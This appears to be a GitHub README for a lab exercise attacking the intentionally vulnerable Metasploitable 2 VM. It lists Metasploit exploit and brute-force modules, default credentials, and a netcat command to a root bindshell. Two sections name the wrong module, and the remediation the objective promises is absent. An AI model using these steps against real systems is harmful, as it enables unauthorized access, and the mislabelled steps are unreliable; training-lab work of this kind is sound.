# Identify-and-Remediate-Vulnerabilities-on-Metasploitable-2

## Objective
The aim of this project was to perform a thorough vulnerability assessment on Metasploitable 2.0, mirroring actual penetration testing conditions. The goal was to discover, take advantage of, and record important weaknesses in the virtual machine in order to improve hands-on experience with different attack methods and approaches. This project also emphasized implementing remediation methods to address identified vulnerabilities and enhance system security, following industry standards for system fortification and secure setups.

## Skilled Learned
- Acquired the skill to recognize and assess system weaknesses, comprehending their origins and possible consequences.
- Improved abilities in taking advantage of system weaknesses and mastering exploit methods for typical vulnerabilities, such as insecure services and outdated software.
- Performed data theft, increased privileges, and maintained access to mimic hacker actions post initial system breach.
- Acquired skills in implementing security updates, disabling unnecessary services, and setting up firewalls to address identified vulnerabilities.
- Recorded the discovered weaknesses, steps to exploit them, and implemented protective measures in an organized report layout.

## Tools Used
- Nmap: Carried out network exploration and port scanning in order to uncover available services and possible access points.
- Metasploit Framework: Utilizing pre-built modules and custom scripts to exploit identified vulnerabilities for more thorough penetration testing.
- Netcat: Access into bindshell bakdoor using netcat (nc) command.

## Steps to Reproduce

### FTP Backdoor (vsftpd)
Exploitation Details:
Module Used: exploit/unix/ftp/vsftpd_234_backdoor
Steps:
- Set target IP (RHOSTS) and port.
- Run exploit to access a backdoor shell.

![image](https://github.com/user-attachments/assets/ac76dde2-c328-4f6f-a043-42296e768b17)
FTP Backdoor

### Unsecured Telnet Service 
Module Used: auxiliary/scanner/telnet/telnet_login
Steps:
- set RHOST (VM IP address)
- set USER_FILE "Username file location"
- set PASS_FILE "Password file location"

setting up the requirements:
![image](https://github.com/user-attachments/assets/26a76b2b-7bcb-4116-83c2-eaa10ca3956f)

Bruteforcing and creating sessions:
![image](https://github.com/user-attachments/assets/549bca94-edf2-4893-8ea9-e20ef0b418e5)

![image](https://github.com/user-attachments/assets/b0900f3c-b018-44e5-b1af-40221dc4cb2b)
Unsecured Telnet service

### Outdated SSH version
The process is same like the previous one.
Module Used: auxiliary/scanner/ssh/ssh_login
Steps:
- set RHOST (VM IP address)
- set USER_FILE "Username file location"
- set PASS_FILE "Password file location"

![image](https://github.com/user-attachments/assets/3cffafe0-c023-4e80-beb9-38086223897b)
Outdated SSH Version

### Samba Unauthenticated Access
Module Used: auxiliary/scanner/ssh/ssh_login
Steps:
- set RHOST (VM IP address)
- Execute the exploit to open a remote shell via Samba misconfiguration.

![image](https://github.com/user-attachments/assets/be1303d3-5c8b-48e3-ab5c-f0a671ea4b01)
Samba Unauthenticated Access

### Bindshell Backdoor (Metasploitable root shell)
- nc 192.168.0.103 1524

![image](https://github.com/user-attachments/assets/11345c83-8e97-48a5-8ded-d23e1d0bbef6)
Bindshell Backdoor

### IRC Backdoor (UnrealIRCd)
- Module Used: exploit/unix/irc/unreal_ircd_3281_backdoor
- Steps:
1.	Set RHOST (Target IP address)
2.	Set LHOST (Attacking IP address)
3.	Set PAYLOAD cmd/unix/bind_netcat or cmd/unix/reverse
4.	Execute the exploit to obtain a remote shell.

![image](https://github.com/user-attachments/assets/72ea2b91-de85-428b-b936-7a20cf483f15)
Unreal IRC Backdoor

### Apache (CGI Argument Injection)
- Module Used: exploit/multi/http/php_cgi_arg_injection
- Steps:
1.	Set  RHOST 
2.	Execute payload to gain shell access.

![image](https://github.com/user-attachments/assets/753ca40a-1930-4d41-8f77-4d8e68ed89f7)
Apache (CGI Argument Injection)

### Remote Code Execution on Java RMI
- Module Used: exploit/multi/http/php_cgi_arg_injection
- Steps:
1.	Set  RHOST 
2.	Execute payload to gain shell access.

![image](https://github.com/user-attachments/assets/d182e0cc-70bb-4668-add4-2d8185301b10)
Remote code Execution on Java RMI

### Unencrypted VNC Connection
- Module Used: auxiliary/scanner/vnc/vnc_login
- Steps:
1.	Set RHOST 
2.	Execute the exploit to obtain a remote shell.
3.	Go to terminal “vncviewer 192.168.0.103” run this command.
4.	Provide the password using the module.

![image](https://github.com/user-attachments/assets/7acaa3a4-f8bf-4fb0-b048-c70044de15a6)

vncviewer 192.168.0.103 and password is "password" as you can see from previous screenshot.
![image](https://github.com/user-attachments/assets/43a5357f-8bae-4173-8fdd-87b876b31f8b)
Unencrypted VNC Connection

### Tomcat Manager RCE
- Module Used: exploit/multi/http/tomcat_mgr_upload
- Steps:
1.	set HttpUsername tomcat
2.	set HttpPassword tomcat
3.	set RPORT 8081
4.	set RHOST 
5.	Execute the exploit to obtain a remote shell.

![image](https://github.com/user-attachments/assets/a840412c-2101-42e4-8786-7bdead7f8b1e)
Tomcat Manager RCE

### Outdated PostgreSQL Database
- Module Used: exploit/linux/postgres/postgres_payload
- Steps:
1.	Set LHOST
2.	Set RHOST
3.	Execute the exploit to obtain a remote shell.

![image](https://github.com/user-attachments/assets/27c7cea3-ca04-4a60-87db-b92a31ce39d7)
Outdated PostgreSQL Database

